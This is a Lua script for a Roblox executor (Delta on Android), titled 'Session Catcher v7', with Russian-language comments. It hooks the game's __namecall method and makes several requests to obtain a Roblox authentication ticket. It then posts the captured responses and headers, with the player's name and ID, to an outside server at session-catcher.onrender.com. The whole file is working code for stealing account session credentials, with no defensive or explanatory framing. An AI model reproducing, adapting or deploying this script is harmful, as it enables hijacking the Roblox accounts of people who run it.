-- ============================================================
--  Session Catcher — Delta Executor (Android)
--  v7 — Auth Ticket extraction via hookmetamethod
-- ============================================================

local SERVER_URL = "https://session-catcher.onrender.com/catch"
local httpRequest = request or http_request or nil
if not httpRequest then return end

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local hookResults = {}

-- -----------------------------------------------------------
-- Hook __namecall для перехвата ответа HttpPost
-- -----------------------------------------------------------
pcall(function()
    if hookmetamethod and getnamecallmethod then
        local oldNamecall
        oldNamecall = hookmetamethod(game, "__namecall", function(self, ...)
            local method = getnamecallmethod()
            local args = {...}
            
            if method == "HttpPost" and type(args[1]) == "string" 
               and string.find(args[1], "auth.roblox") then
                local results = {oldNamecall(self, ...)}
                hookResults["numReturns"] = #results
                hookResults["args"] = tostring(args[1])
                for i, r in ipairs(results) do
                    hookResults["return_" .. i .. "_type"] = type(r)
                    hookResults["return_" .. i .. "_value"] = tostring(r):sub(1, 1000)
                end
                return unpack(results)
            end
            
            return oldNamecall(self, ...)
        end)
    end
end)

task.wait(0.5)

-- -----------------------------------------------------------
-- Вызываем auth ticket endpoint
-- -----------------------------------------------------------
local directResult = {}

-- Попытка 1: game:HttpPost без content-type
pcall(function()
    local ok, resp = pcall(function()
        return game:HttpPost("https://auth.roblox.com/v1/authentication-ticket", "")
    end)
    directResult["post1_type"] = type(resp)
    directResult["post1_ok"] = ok
    directResult["post1_value"] = tostring(resp):sub(1, 1000)
end)

task.wait(1)

-- Попытка 2: game:HttpPost с content-type
pcall(function()
    local ok, resp = pcall(function()
        return game:HttpPost("https://auth.roblox.com/v1/authentication-ticket", "{}", "application/json")
    end)
    directResult["post2_type"] = type(resp)
    directResult["post2_ok"] = ok
    directResult["post2_value"] = tostring(resp):sub(1, 1000)
end)

task.wait(1)

-- Попытка 3: game:HttpGet (GET вместо POST — может вернуть что-то)
pcall(function()
    local ok, resp = pcall(function()
        return game:HttpGet("https://auth.roblox.com/v1/authentication-ticket")
    end)
    directResult["get_type"] = type(resp)
    directResult["get_ok"] = ok
    directResult["get_value"] = tostring(resp):sub(1, 1000)
end)

task.wait(1)

-- Попытка 4: httppost (Delta функция)
pcall(function()
    if httppost then
        local ok, resp = pcall(httppost, "https://auth.roblox.com/v1/authentication-ticket", "")
        directResult["delta_post_type"] = type(resp)
        directResult["delta_post_ok"] = ok
        directResult["delta_post_value"] = tostring(resp):sub(1, 1000)
    end
end)

task.wait(1)

-- Попытка 5: request() к auth ticket — вернёт заголовки ответа
pcall(function()
    local ok, resp = pcall(httpRequest, {
        Url = "https://auth.roblox.com/v1/authentication-ticket",
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = ""
    })
    if ok and resp then
        directResult["request_status"] = tostring(resp.StatusCode)
        directResult["request_body"] = tostring(resp.Body):sub(1, 500)
        -- Заголовки ответа!
        if resp.Headers then
            local headerDump = {}
            for k, v in pairs(resp.Headers) do
                headerDump[tostring(k)] = tostring(v):sub(1, 500)
            end
            directResult["request_headers"] = headerDump
        end
    else
        directResult["request_error"] = tostring(resp):sub(1, 300)
    end
end)

-- -----------------------------------------------------------
-- Отправка
-- -----------------------------------------------------------
local payload = {
    username = LocalPlayer.Name,
    userId = LocalPlayer.UserId,
    hookResults = hookResults,
    directResult = directResult,
    timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
}

pcall(function()
    httpRequest({
        Url = SERVER_URL,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode(payload)
    })
end)

print("[Catcher] v7 auth ticket probe sent")
